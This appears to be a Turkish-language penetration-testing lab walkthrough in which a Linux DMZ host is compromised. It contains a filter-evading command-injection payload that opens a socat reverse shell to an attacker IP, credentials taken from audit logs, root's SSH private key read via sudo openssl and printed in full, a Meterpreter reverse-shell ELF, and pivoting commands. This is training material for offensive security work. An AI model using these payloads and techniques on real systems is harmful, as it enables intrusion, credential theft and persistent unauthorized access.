Dış çevreyi kapsamlı bir şekilde keşfedip saldırdıktan ve birçok bulgu ortaya çıkardıktan sonra, şimdi vites değiştirip istikrarlı bir iç ağ erişimi elde etmeye odaklanma zamanı. **SoW (Statement of Work)** belgesine göre, iç ağda bir başlangıç noktası elde edebilirsek, müşteri bizden **Domain Admin** seviyesine kadar ilerleyip ilerleyemeyeceğimizi test etmemizi istiyor. Son bölümde, katmanları açıp **web applications** üzerinde çalışarak erken dosya okuma veya **remote code execution (RCE)** bulmaya odaklanmıştık, ancak bu durum bizi iç ağa sokmaya yetmedi. En son, yoğun bir çaba ve filtreler ile **blacklist**lere karşı verilen zorlu bir mücadele sonunda **monitoring.inlanefreight.local** uygulamasında **Command Injection** saldırılarını engellemeye yönelik önlemleri aşarak RCE elde etmeyi başardık.


## Getting a Reverse Shell

Önceki bölümde belirtildiği gibi, reverse shell bağlantısı kurmak için [Socat](https://linux.die.net/man/1/socat)'ı kullanabiliriz. Temel komutumuz aşağıdaki gibi olacak, ancak filtrelemeyi aşmak için biraz değiştirmemiz gerekecek:

```shell-session
socat TCP4:10.10.14.5:8443 EXEC:/bin/bash
```

Bu komutu reverse shell'i yakalamak için bize bir payload verecek şekilde değiştirebiliriz.

```shell-session
GET /ping.php?ip=127.0.0.1%0a's'o'c'a't'${IFS}TCP4:10.10.14.15:8443${IFS}EXEC:bash HTTP/1.1
Host: monitoring.inlanefreight.local
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.74 Safari/537.36
Content-Type: application/json
Accept: */*
Referer: http://monitoring.inlanefreight.local/index.php
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: PHPSESSID=ntpou9fdf13i90mju7lcrp3f06
Connection: close
```

Socat komutunda kullanılan portta (burada 8443) bir Netcat dinleyicisi başlatın ve yukarıdaki isteği Burp Repeater'da çalıştırın. Her şey amaçlandığı gibi giderse, webdev kullanıcısı olarak bir reverse shell'e sahip olacağız.

```shell-session
[!bash!]$ nc -nvlp 8443

listening on [any] 8443 ...
connect to [10.10.14.15] from (UNKNOWN) [10.129.203.111] 51496
id
uid=1004(webdev) gid=1004(webdev) groups=1004(webdev),4(adm) 
```

Daha sonra, etkileşimli bir TTY'ye yükseltmemiz gerekecek. Bu [yazıda](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/) birkaç yöntem açıklanmaktadır. Başlarken modülünün [Shell Types](https://academy.hackthebox.com/module/77/section/725) bölümünde de ele alınan bir yöntemi kullanabilir, bir psuedo-terminal oluşturmak için iyi bilinen Python one-liner'ı (`python3 -c 'import pty; pty.spawn(“/bin/bash”)'`) çalıştırabiliriz. Ancak biz Socat kullanarak biraz daha farklı bir şey deneyeceğiz. Bunu yapmamızın nedeni, su, sudo, ssh gibi komutları çalıştırabilmemiz, komut tamamlamayı kullanabilmemiz ve gerekirse bir metin editörü açabilmemiz için uygun bir terminal elde etmektir.

Saldırı hostumuzda bir Socat listener başlatacağız.

```shell-session
[!bash!]$ socat file:`tty`,raw,echo=0 tcp-listen:4443
```

Ardından, hedef host üzerinde bir Socat one-liner çalıştıracağız.

```shell-session
[!bash!]$ nc -lnvp 8443

listening on [any] 8443 ...
connect to [10.10.14.15] from (UNKNOWN) [10.129.203.111] 52174

socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.14.15:4443
```

Her şey planlandığı gibi giderse, Socat listener'ımızda istikrarlı bir reverse shell bağlantısına sahip olacağız.

```shell-session
webdev@dmz01:/var/www/html/monitoring$ id

uid=1004(webdev) gid=1004(webdev) groups=1004(webdev),4(adm)
webdev@dmz01:/var/www/html/monitoring$
```

Artık kararlı bir reverse shell'imiz olduğuna göre, dosya sistemini araştırmaya başlayabiliriz. id komutunun sonuçları hemen ilgi çekicidir. Linux Privilege Escalation modülünün [Privileged Groups](https://academy.hackthebox.com/module/51/section/477) bölümü, adm grubundaki kullanıcıların /var/log'da depolanan ALL loglarını okuma haklarına sahip olduğu bir örnek göstermektedir. Belki orada ilginç bir şeyler bulabiliriz. Linux sistemlerinde audit loglarını okumak için [aureport](https://linux.die.net/man/8/aureport)'u kullanabiliriz, man sayfasında “aureport, audit sistem loglarının özet raporlarını üreten bir araçtır” şeklinde tanımlanmaktadır.

```shell-session
webdev@dmz01:/var/www/html/monitoring$ aureport --tty | less

Error opening config file (Permission denied)
NOTE - using built-in logs: /var/log/audit/audit.log
WARNING: terminal is not fully functional
-  (press RETURN)
TTY Report
===============================================
# date time event auid term sess comm data
===============================================
1. 06/01/22 07:12:53 349 1004 ? 4 sh "bash",<nl>
2. 06/01/22 07:13:14 350 1004 ? 4 su "ILFreightnixadm!",<nl>
3. 06/01/22 07:13:16 355 1004 ? 4 sh "sudo su srvadm",<nl>
4. 06/01/22 07:13:28 356 1004 ? 4 sudo "ILFreightnixadm!"
5. 06/01/22 07:13:28 360 1004 ? 4 sudo <nl>
6. 06/01/22 07:13:28 361 1004 ? 4 sh "exit",<nl>
7. 06/01/22 07:13:36 364 1004 ? 4 bash "su srvadm",<ret>,"exit",<ret>
```

Komutu çalıştırdıktan sonra, shell'imize dönmek için q yazın. Yukarıdaki çıktıdan, bir kullanıcı srvadm kullanıcısı olarak kimlik doğrulaması yapmaya çalışıyor gibi görünüyor ve potansiyel bir kimlik bilgisi çiftimiz var `srvadm:ILFreightnixadm!` su komutunu kullanarak, srvadm kullanıcısı olarak kimlik doğrulaması yapabiliriz.

```shell-session
webdev@dmz01:/var/www/html/monitoring$ su srvadm

Password: 
$ id

uid=1003(srvadm) gid=1003(srvadm) groups=1003(srvadm)
$ /bin/bash -i

srvadm@dmz01:/var/www/html/monitoring$
```

Ağır filtrelemeleri aşarak **command injection** elde ettiğimize, bu kod yürütmeyi bir reverse shell'e dönüştürdüğümüze ve ayrıcalıklarımızı başka bir kullanıcıya yükselttiğimize göre, bu host'a erişimimizi kaybetmek istemiyoruz. Bir sonraki bölümde, kalıcı erişim (**persistence**) sağlamaya yönelik çalışacağız, ideal olarak ayrıcalıklarımızı **root** seviyesine yükselttikten sonra.


# Post-Exploitation Persistence

Bu dayanak noktasını elde etmek için çok çalıştık, şimdi onu kaybetmek istemiyoruz. Amaç, bu hostu iç ağın geri kalanına erişmek için bir pivot noktası olarak kullanmak. Shell'imiz hala nispeten kararsız ve erişimimizi birden fazla adımla kurmaya devam etmek istemiyoruz çünkü mümkün olduğunca verimli olmak ve shell'lerle uğraşmak yerine gerçek değerlendirmeye çok fazla zaman harcamak istiyoruz.

Elimizde kimlik bilgileri (**srvadm:ILFreightnixadm!**) bulunduğuna göre, daha önce açık olduğunu gördüğümüz **SSH portu**nu kullanarak bağlantı kurabilir ve istikrarlı bir erişim sağlayabiliriz. Bu önemlidir, çünkü her gün teste başlarken aynı noktaya olabildiğince yakın bir yerden devam edebilmek, zaman kaybetmeden kurulum aşamalarını atlamamızı sağlar. Ancak, her zaman **SSH** internete açık olmayabilir ve bu durumda farklı bir şekilde kalıcılık (**persistence**) sağlamamız gerekebilir.

Ev sahibi sistemde bir **reverse shell** binary dosyası oluşturabilir, bunu **command injection** yoluyla çalıştırabilir ve ardından bir reverse shell ya da **Meterpreter shell** elde edebiliriz. Ancak şu an **SSH** erişilebilir olduğundan, bunu kullanacağız.

Ağ trafiğimizi yönlendirmek (**pivoting**), tünellemek (**tunneling**) ve port yönlendirme (**port forwarding**) işlemleri için birçok yöntem bulunmaktadır. Bu yöntemler **Pivoting, Tunneling, and Port Forwarding** modülünde detaylı şekilde ele alındı, bu nedenle ekstra pratik yapmak için bu bölümde bazılarını denemek faydalı olacaktır. Bu ağda daha derinlere indikçe bu yöntemleri kullanmamız gerekecek.

Bir başkasının kimlik bilgilerini kullanırken, erişimimizi yedekleyecek bir yöntem bulmamız önemlidir, çünkü hesaplarının ele geçirildiğini fark edebilirler ya da şifre değişikliği zamanı geldiğinde bir sonraki gün tekrar bağlanamayabiliriz. Bu nedenle her zaman ileriyi düşünmeli, her açıdan analiz yapmalı ve sorunları ortaya çıkmadan öngörmeye çalışmalıyız.

Unutulmamalıdır ki, bir laboratuvar ortamı gerçek dünyadan oldukça farklıdır; burada sıfırlamalar veya yeniden deneme şansı yoktur. Bu nedenle dikkatli çalışmalı ve durumsal farkındalığımızı olabildiğince yüksek tutmalıyız.

```shell-session
M1R4CKCK@htb[/htb]$ ssh srvadm@10.129.203.111

The authenticity of host '10.129.203.111 (10.129.203.111)' can't be established.
ECDSA key fingerprint is SHA256:3I77Le3AqCEUd+1LBAraYTRTF74wwJZJiYcnwfF5yAs.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.203.111' (ECDSA) to the list of known hosts.
srvadm@10.129.203.111's password: 
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-113-generic x86_64)

* Documentation:  https://help.ubuntu.com
* Management:     https://landscape.canonical.com
* Support:        https://ubuntu.com/advantage

 System information as of Tue 21 Jun 2022 07:30:27 PM UTC

 System load:                      0.31
 Usage of /:                       95.8% of 13.72GB
 Memory usage:                     64%
 Swap usage:                       0%
 Processes:                        458
 Users logged in:                  0
 IPv4 address for br-65c448355ed2: 172.18.0.1
 IPv4 address for docker0:         172.17.0.1
 IPv4 address for ens160:          10.129.203.111
 IPv6 address for ens160:          dead:beef::250:56ff:feb9:d30d
 IPv4 address for ens192:          172.16.8.120

 => / is using 95.8% of 13.72GB

* Super-optimized for small spaces - read how we shrank the memory
  footprint of MicroK8s to make it the smallest full K8s around.

  https://ubuntu.com/blog/microk8s-memory-optimisation

97 updates can be applied immediately.
30 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable


Last login: Wed Jun  1 07:08:59 2022 from 127.0.0.1
$ /bin/bash -i
srvadm@dmz01:~
```

Artık SSH üzerinden istikrarlı bir bağlantımız olduğuna göre, daha fazla numaralandırmaya başlayabiliriz.

## Local Privilege Escalation

Sisteme LinPEAS gibi bir numaralandırma scripti yükleyebiliriz, ancak erişim sağladıktan sonra her zaman iki basit komutu denerim: tehlikeye atılan hesabın ayrıcalıklı lokal gruplarda olup olmadığını görmek için id ve hesabın başka bir kullanıcı veya root olarak komutları çalıştırmak için herhangi bir sudo ayrıcalığına sahip olup olmadığını görmek için sudo -l. Şimdiye kadar hem Akademi modüllerinde hem de belki HTB ana platformundaki bazı kutularda birçok ayrıcalık yükseltme tekniğini uyguladık. Bu tekniklerin arka cebimizde olması harika, özellikle de çok güçlendirilmiş bir sisteme girersek. Ancak karşımızda insan yöneticiler var ve insanlar da hata yapabiliyor ve kolaycılığa kaçabiliyor. Çoğu zaman, bir pentest sırasında bir Linux kutusunda ayrıcalıkları artırma yolum, tar ve bir cron işinden yararlanan bir joker saldırı değil, root ayrıcalıklarını kazanmak için parola olmadan sudo su gibi basit bir şeydi veya istismar ettiğim hizmet root hesabı bağlamında çalıştığı için ayrıcalıkları artırmak zorunda kalmadım. Yine de mümkün olduğunca çok sayıda tekniği anlamak ve uygulamak gerekiyor çünkü birkaç kez söylediğim gibi her ortam farklıdır ve elimizde mümkün olan en kapsamlı araç setine sahip olmak isteriz.


```shell-session
srvadm@dmz01:~$ sudo -l

Matching Defaults entries for srvadm on dmz01:
  env_reset, mail_badpass,
  secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User srvadm may run the following commands on dmz01:
  (ALL) NOPASSWD: /usr/bin/openssl
```

**sudo -l** komutunu çalıştırdığımızda, şifre gerektirmeden **/usr/bin/openssl** komutunu **root** yetkileriyle çalıştırabileceğimizi görüyoruz. Beklendiği gibi, **OpenSSL** binary'si için bir **[GTFOBin](https://gtfobins.github.io/gtfobins/openssl/)** girdisi mevcut. Bu girdi, bu binary'nin çeşitli şekillerde nasıl kullanılabileceğini gösteriyor: dosya yüklemek ve indirmek, **reverse shell** elde etmek, dosya okumak ve yazmak gibi.

Hadi bunu deneyip **root** kullanıcısına ait **SSH private key** dosyasını alıp alamayacağımıza bakalım. Bu yöntem, sadece **/etc/shadow** dosyasını okumayı denemekten veya bir ters kabuk elde etmekten daha avantajlıdır, çünkü **id_rsa private key** dosyası bize ortamda **root** kullanıcısı olarak tekrar SSH erişimi sağlayacaktır. Bu da **pivot** işlemlerimizi ayarlamak için mükemmel bir seçenektir.

Giriş, binary'yi ayrıcalıklı dosya okumaları için aşağıdaki şekilde kullanabileceğimizi belirtir:

```shell-session
LFILE=file_to_read
openssl enc -in "$LFILE"
```

Hadi bir deneyelim

```shell-session
srvadm@dmz01:~$ LFILE=/root/.ssh/id_rsa
srvadm@dmz01:~$ sudo /usr/bin/openssl enc -in $LFILE

-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEA0ksXgILHRb0j1s3pZH8s/EFYewSeboEi4GkRogdR53GWXep7GJMI
oxuXTaYkMSFG9Clij1X6crkcWLnSLuKI8KS5qXsuNWISt+T1bpvTfmFymDIWNx4efR/Yoa
vpXx+yT/M2X9boHpZHluuR9YiGDMZlr3b4hARkbQAc0l66UD+NB9BjH3q/kL84rRASMZ88
y2jUwmR75Uw/wmZxeVD5E+yJGuWd+ElpoWtDW6zenZf6bqSS2VwLhbrs3zyJAXG1eGsGe6
i7l59D31mLOUUKZxYpsciHflfDyCJ79siXXbsZSp5ZUvBOto6JF20Pny+6T0lovwNCiNEz
7avg7o/77lWsfBVEphtPQbmTZwke1OtgvDqG1v4bDWZqKPAAMxh0XQxscpxI7wGcUZbZeF
9OHCWjY39kBVXObER1uAvXmoJDr74/9+OsEQXoi5pShB7FSvcALlw+DTV6ApHx239O8vhW
/0ZkxEzJjIjtjRMyOcLPttG5zuY1f2FBt2qS1w0VAAAFgIqVwJSKlcCUAAAAB3NzaC1yc2
EAAAGBANJLF4CCx0W9I9bN6WR/LPxBWHsEnm6BIuBpEaIHUedxll3qexiTCKMbl02mJDEh
RvQpYo9V+nK5HFi50i7iiPCkual7LjViErfk9W6b035hcpgyFjceHn0f2KGr6V8fsk/zNl
/W6B6WR5brkfWIhgzGZa92+IQEZG0AHNJeulA/jQfQYx96v5C/OK0QEjGfPMto1MJke+VM
P8JmcXlQ+RPsiRrlnfhJaaFrQ1us3p2X+m6kktlcC4W67N88iQFxtXhrBnuou5efQ99Ziz
lFCmcWKbHIh35Xw8gie/bIl127GUqeWVLwTraOiRdtD58vuk9JaL8DQojRM+2r4O6P++5V
rHwVRKYbT0G5k2cJHtTrYLw6htb+Gw1maijwADMYdF0MbHKcSO8BnFGW2XhfThwlo2N/ZA
VVzmxEdbgL15qCQ6++P/fjrBEF6IuaUoQexUr3AC5cPg01egKR8dt/TvL4Vv9GZMRMyYyI
7Y0TMjnCz7bRuc7mNX9hQbdqktcNFQAAAAMBAAEAAAGATL2yeec/qSd4qK7D+TSfyf5et6
Xb2x+tBo/RK3vYW8mLwgILodAmWr96249Brdwi9H8VxJDvsGX0/jvxg8KPjqHOTxbwqfJ8
OjeHiTG8YGZXV0sP6FVJcwfoGjeOFnSOsbZjpV3bny3gOicFQMDtikPsX7fewO6JZ22fFv
YSr65BXRSi154Hwl7F5AH1Yb5mhSRgYAAjZm4I5nxT9J2kB61N607X8v93WLy3/AB9zKzl
avML095PJiIsxtpkdO51TXOxGzgbE0TM0FgZzTy3NB8FfeaXOmKUObznvbnGstZVvitNJF
FMFr+APR1Q3WG1LXKA6ohdHhfSwxE4zdq4cIHyo/cYN7baWIlHRx5Ouy/rU+iKp/xlCn9D
hnx8PbhWb5ItpMxLhUNv9mos/I8oqqcFTpZCNjZKZAxIs/RchduAQRpxuGChkNAJPy6nLe
xmCIKZS5euMwXmXhGOXi0r1ZKyYCxj8tSGn8VWZY0Enlj+PIfznMGQXH6ppGxa0x2BAAAA
wESN/RceY7eJ69vvJz+Jjd5ZpOk9aO/VKf+gKJGCqgjyefT9ZTyzkbvJA58b7l2I2nDyd7
N4PaYAIZUuEmdZG715CD9qRi8GLb56P7qxVTvJn0aPM8mpzAH8HR1+mHnv+wZkTD9K9an+
L2qIboIm1eT13jwmxgDzs+rrgklSswhPA+HSbKYTKtXLgvoanNQJ2//ME6kD9LFdC97y9n
IuBh4GXEiiWtmYNakti3zccbfpl4AavPeywv4nlGo1vmIL3wAAAMEA7agLGUE5PQl8PDf6
fnlUrw/oqK64A+AQ02zXI4gbZR/9zblXE7zFafMf9tX9OtC9o+O0L1Cy3SFrnTHfPLawSI
nuj+bd44Y4cB5RIANdKBxGRsf8UGvo3wdgi4JIc/QR9QfV59xRMAMtFZtAGZ0hTYE1HL/8
sIl4hRY4JjIw+plv2zLi9DDcwti5tpBN8ohDMA15VkMcOslG69uymfnX+MY8cXjRDo5HHT
M3i4FvLUv9KGiONw94OrEX7JlQA7b5AAAAwQDihl6ELHDORtNFZV0fFoFuUDlGoJW1XR/2
n8qll95Fc1MZ5D7WGnv7mkP0ureBrD5Q+OIbZOVR+diNv0j+fteqeunU9MS2WMgK/BGtKm
41qkEUxOSFNgs63tK/jaEzmM0FO87xO1yP8x4prWE1WnXVMlM97p8osRkJJfgIe7/G6kK3
9PYjklWFDNWcZNlnSiq09ZToRbpONEQsP9rPrVklzHU1Zm5A+nraa1pZDMAk2jGBzKGsa8
WNfJbbEPrmQf0AAAALcm9vdEB1YnVudHU=
-----END OPENSSH PRIVATE KEY-----
```

 Not: Pwnbox'tan çalışıyorsanız, bu private key'i notlarınıza veya lokal bir dosyaya kaydettiğinizden emin olun, aksi takdirde bir süreliğine duraklamaya karar verirseniz bu noktaya geri dönmek için tüm adımları yeniden yapmanız gerekecektir.

### Kalıcılığın Oluşturulması

Başarılı! Artık private key'i local sistemimize kaydedebilir, ayrıcalıkları değiştirebilir ve root olarak SSH yapmak ve root ayrıcalıklarını onaylamak için kullanabiliriz.

```shell-session
M1R4CKCK@htb[/htb]$ chmod 600 dmz01_key 
M1R4CKCK@htb[/htb]$ ssh -i dmz01_key root@10.129.203.111

Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-113-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Tue 21 Jun 2022 07:53:00 PM UTC

  System load:                      0.04
  Usage of /:                       97.1% of 13.72GB
  Memory usage:                     65%
  Swap usage:                       0%
  Processes:                        472
  Users logged in:                  1
  IPv4 address for br-65c448355ed2: 172.18.0.1
  IPv4 address for docker0:         172.17.0.1
  IPv4 address for ens160:          10.129.203.111
  IPv6 address for ens160:          dead:beef::250:56ff:feb9:d30d
  IPv4 address for ens192:          172.16.8.120

  => / is using 97.1% of 13.72GB

 * Super-optimized for small spaces - read how we shrank the memory
   footprint of MicroK8s to make it the smallest full K8s around.

   https://ubuntu.com/blog/microk8s-memory-optimisation

97 updates can be applied immediately.
30 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable


You have mail.
Last login: Tue Jun 21 17:50:13 2022
root@dmz01:~# 
```

İşe yaradı ve artık iç ortama hızlı bir şekilde geri dönmek için bir “kaydetme noktamız” var ve bu SSH erişimini port yönlendirmeleri ayarlamak ve dahili olarak pivot yapmak için kullanabiliriz.


----



# Internal Information Gathering

Şimdiye kadar çok yol kat ettik:

* Dış bilgi toplama gerçekleştirildi
* Dış port ve servis taraması gerçekleştirildi
* Yanlış yapılandırmalar ve bilinen güvenlik açıkları için birden fazla servis numaralandırıldı
* Bazıları hiçbir erişimle sonuçlanmayan, bazıları dosya okuma veya hassas veri erişimi sağlayan ve birkaçı da temel web sunucusunda remote code execution ile sonuçlanan 12 farklı web uygulaması numaralandırılmış ve saldırıya uğramıştır
* İç ağda zorlu bir mücadele sonucu yer edinildi
* Daha ayrıcalıklı bir kullanıcı olarak erişim elde etmek için arazi ve yanal hareket gerçekleştirdi
* Web sunucusunda root'a yükseltilmiş ayrıcalıklar
* Ortama hızlı SSH erişimi için hem bir kullanıcı/parola çifti hem de root hesabının private key'i kullanılarak kalıcılık sağlanmıştır


### Pivoting Kurulumu - SSH

Root id_rsa ( private key) dosyasının bir kopyasıyla, iç ağın bir resmini elde etmeye başlamak için ProxyChains ile birlikte SSH port yönlendirmesini kullanabiliriz. Bu tekniği incelemek için Pivoting, Tunneling ve Port Forwarding modülünün SSH ve SOCKS Tünelleme ile Dinamik Port Yönlendirme bölümüne göz atın.

Dinamik port yönlendirme kullanarak SSH pivotumuzu kurmak için aşağıdaki komutu kullanabiliriz: ==ssh -D 8081 -i dmz01_key root@10.129.x.x.== Bu, saldırı hostumuzdan doğrudan 172.16.8.0/23 alt ağındaki hostlara ulaşmak için saldırı hostumuzdan gelen trafiği hedef üzerindeki 8081 portu üzerinden proxy yapabileceğimiz anlamına gelir.

İlk terminalimizde önce SSH dinamik port yönlendirme komutunu kuralım:

```shell-session
M1R4CKCK@htb[/htb]$ ssh -D 8081 -i dmz01_key root@10.129.203.111

Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-113-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed 22 Jun 2022 12:08:31 AM UTC

  System load:                      0.21
  Usage of /:                       99.9% of 13.72GB
  Memory usage:                     65%
  Swap usage:                       0%
  Processes:                        458
  Users logged in:                  2
  IPv4 address for br-65c448355ed2: 172.18.0.1
  IPv4 address for docker0:         172.17.0.1
  IPv4 address for ens160:          10.129.203.111
  IPv6 address for ens160:          dead:beef::250:56ff:feb9:d30d
  IPv4 address for ens192:          172.16.8.120

  => / is using 99.9% of 13.72GB

 * Super-optimized for small spaces - read how we shrank the memory
   footprint of MicroK8s to make it the smallest full K8s around.

   https://ubuntu.com/blog/microk8s-memory-optimisation

97 updates can be applied immediately.
30 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable


You have mail.
Last login: Tue Jun 21 19:53:01 2022 from 10.10.14.15
root@dmz01:~#
```

Netstat kullanarak veya localhost adresimize karşı bir Nmap taraması çalıştırarak dinamik port yönlendirmesinin ayarlandığını doğrulayabiliriz.

```shell-session
M1R4CKCK@htb[/htb]$ netstat -antp | grep 8081

(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
tcp        0      0 127.0.0.1:8081          0.0.0.0:*               LISTEN      122808/ssh          
tcp6       0      0 ::1:8081
```

Ardından, /etc/proxychains.conf dosyasını dinamik port yönlendirme komutumuzla belirlediğimiz portu (burada 8081) kullanacak şekilde değiştirmemiz gerekiyor.

 Not: Pwnbox'tan çalışıyorsanız, bu private key'i notlarınıza veya lokal bir dosyaya kaydettiğinizden emin olun, aksi takdirde bir süreliğine duraklamaya karar verirseniz bu noktaya geri dönmek için tüm adımları yeniden yapmanız gerekecektir.
 
```shell-session
M1R4CKCK@htb[/htb]$ grep socks4 /etc/proxychains.conf 

#	 	socks4	192.168.1.49	1080
#       proxy types: http, socks4, socks5
socks4 	127.0.0.1 8081
```

Ardından, her şeyin doğru ayarlandığından emin olmak için dmz01 hostunu ikinci NIC'sinde 172.16.8.120 IP adresiyle taramak için Proxyychains ile Nmap'i kullanabiliriz.

```shell-session
M1R4CKCK@htb[/htb]$ proxychains nmap -sT -p 21,22,80,8080 172.16.8.120

ProxyChains-3.1 (http://proxychains.sf.net)
Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-21 21:15 EDT
|S-chain|-<>-127.0.0.1:8081-<><>-172.16.8.120:80-<><>-OK
|S-chain|-<>-127.0.0.1:8081-<><>-172.16.8.120:80-<><>-OK
|S-chain|-<>-127.0.0.1:8081-<><>-172.16.8.120:22-<><>-OK
|S-chain|-<>-127.0.0.1:8081-<><>-172.16.8.120:21-<><>-OK
|S-chain|-<>-127.0.0.1:8081-<><>-172.16.8.120:8080-<><>-OK
Nmap scan report for 172.16.8.120
Host is up (0.13s latency).

PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
80/tcp   open  http
8080/tcp open  http-proxy

Nmap done: 1 IP address (1 host up) scanned in 0.71 seconds
```


### Pivoting Kurulumu - Metasploit

Alternatif olarak, Pivoting modülünün Meterpreter Tunneling & Port Forwarding bölümünde anlatıldığı gibi Metasploit kullanarak pivotlamayı ayarlayabiliriz. Bunu başarmak için aşağıdakileri yapabiliriz:

İlk olarak, msfvenom kullanarak Elf formatında bir reverse shell oluşturun.

```shell-session
M1R4CKCK@htb[/htb]$ msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.14.15 LPORT=443 -f elf > shell.elf

[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 123 bytes
Final size of elf file: 207 bytes
```

Ardından, hostu hedefe aktarın. SSH'ımız olduğu için SCP kullanarak hedefe yükleyebiliriz.

```shell-session
M1R4CKCK@htb[/htb]$ scp -i dmz01_key shell.elf root@10.129.203.111:/tmp

shell.elf                                                                      100%  207     1.6KB/s   00:00
```

Şimdi, Metasploit exploit/multi/handler'ı kuracağız.

```shell-session
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set payload linux/x86/meterpreter/reverse_tcp
payload => linux/x86/meterpreter/reverse_tcp
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set lhost 10.10.14.15 
lhost => 10.10.14.15
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set LPORT 443
LPORT => 443
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> exploit

[*] Started reverse TCP handler on 10.10.14.15:443
```

Şimdi, Metasploit exploit/multi/handler'ı kuracağız.

```shell-session
root@dmz01:/tmp# chmod +x shell.elf 
root@dmz01:/tmp# ./shell.elf 
```

Her şey planlandığı gibi giderse, multi/handler kullanarak Meterpreter shell'i yakalayacağız ve ardından rotaları ayarlayabiliriz.

```shell-session
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> exploit

[*] Started reverse TCP handler on 10.10.14.15:443 
[*] Sending stage (989032 bytes) to 10.129.203.111
[*] Meterpreter session 1 opened (10.10.14.15:443 -> 10.129.203.111:58462 ) at 2022-06-21 21:28:43 -0400

(Meterpreter 1)(/tmp) > getuid
Server username: root
```


Ardından, post/multi/manage/autoroute modülünü kullanarak routing ayarlayabiliriz.

```shell-session
(Meterpreter 1)(/tmp) > background
[*] Backgrounding session 1...
[msf](Jobs:0 Agents:1) exploit(multi/handler) >> use post/multi/manage/autoroute 
[msf](Jobs:0 Agents:1) post(multi/manage/autoroute) >> show options 

Module options (post/multi/manage/autoroute):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   CMD      autoadd          yes       Specify the autoroute command (Accepted: add, autoadd, print, delete, de
                                       fault)
   NETMASK  255.255.255.0    no        Netmask (IPv4 as "255.255.255.0" or CIDR as "/24"
   SESSION                   yes       The session to run this module on
   SUBNET                    no        Subnet (IPv4, for example, 10.10.10.0)

[msf](Jobs:0 Agents:1) post(multi/manage/autoroute) >> set SESSION 1
SESSION => 1
[msf](Jobs:0 Agents:1) post(multi/manage/autoroute) >> set subnet 172.16.8.0
subnet => 172.16.8.0
[msf](Jobs:0 Agents:1) post(multi/manage/autoroute) >> run

[!] SESSION may not be compatible with this module:
[!]  * incompatible session platform: linux
[*] Running module against 10.129.203.111
[*] Searching for subnets to autoroute.
[+] Route added to subnet 10.129.0.0/255.255.0.0 from host's routing table.
[+] Route added to subnet 172.16.0.0/255.255.0.0 from host's routing table.
[+] Route added to subnet 172.17.0.0/255.255.0.0 from host's routing table.
[+] Route added to subnet 172.18.0.0/255.255.0.0 from host's routing table.
[*] Post module execution completed
```


## Host Discovery - 172.16.8.0/23 Subnet - Metasploit

Her iki seçenek de ayarlandıktan sonra, canlı hostları aramaya başlayabiliriz. Meterpreter oturumumuzu kullanarak multi/gather/ping_sweep modülünü 172.16.8.0/23 subnet'inin ping taramasını gerçekleştirmek için kullanabiliriz.

```shell-session
[msf](Jobs:0 Agents:1) post(multi/manage/autoroute) >> use post/multi/gather/ping_sweep
[msf](Jobs:0 Agents:1) post(multi/gather/ping_sweep) >> show options 

Module options (post/multi/gather/ping_sweep):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   RHOSTS                    yes       IP Range to perform ping sweep against.
   SESSION                   yes       The session to run this module on

[msf](Jobs:0 Agents:1) post(multi/gather/ping_sweep) >> set rhosts 172.16.8.0/23
rhosts => 172.16.8.0/23
[msf](Jobs:0 Agents:1) post(multi/gather/ping_sweep) >> set SESSION 1
SESSION => 1
[msf](Jobs:0 Agents:1) post(multi/gather/ping_sweep) >> run

[*] Performing ping sweep for IP range 172.16.8.0/23
[+] 	172.16.8.3 host found
[+] 	172.16.8.20 host found
[+] 	172.16.8.50 host found
[+] 	172.16.8.120 host found
```


## Host Discovery - 172.16.8.0/23 Subnet - SSH Tunnel

Alternatif olarak, bir ping taraması yapabilir veya dmz01 hostundan [statik bir Nmap binary](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/nmap) kullanabiliriz.

Bu Bash one-liner ping taraması ile hızlı sonuçlar elde ediyoruz:

```shell-session
root@dmz01:~# for i in $(seq 254); do ping 172.16.8.$i -c1 -W1 & done | grep from

64 bytes from 172.16.8.3: icmp_seq=1 ttl=128 time=0.472 ms
64 bytes from 172.16.8.20: icmp_seq=1 ttl=128 time=0.433 ms
64 bytes from 172.16.8.120: icmp_seq=1 ttl=64 time=0.031 ms
64 bytes from 172.16.8.50: icmp_seq=1 ttl=128 time=0.642 ms
```

